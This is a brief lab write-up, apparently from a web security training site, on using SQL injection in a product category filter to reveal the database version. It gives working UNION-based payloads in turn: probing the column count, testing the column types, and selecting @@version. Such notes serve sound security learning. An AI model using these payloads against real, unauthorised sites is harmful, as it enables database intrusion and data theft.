# SQL injection attack, querying the database type and version on MySQL and Microsoft

1. SQLi: product category filter.
2. Goal: display the database version string.

### Analysis
- Website target: `https://0a3d00e004823097806162b90064008f.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find number of columns.
```sql
' order by 2#
'-- I found 2 columns.
```

2. Find the data types of the column.
```sql
' union select 'a', 'a'#
'-- This 2 columns of data type is text. 
```

3. Output the version of the database.
```sql
SELECT @@version --Microsoft
' union select @@version, null#
```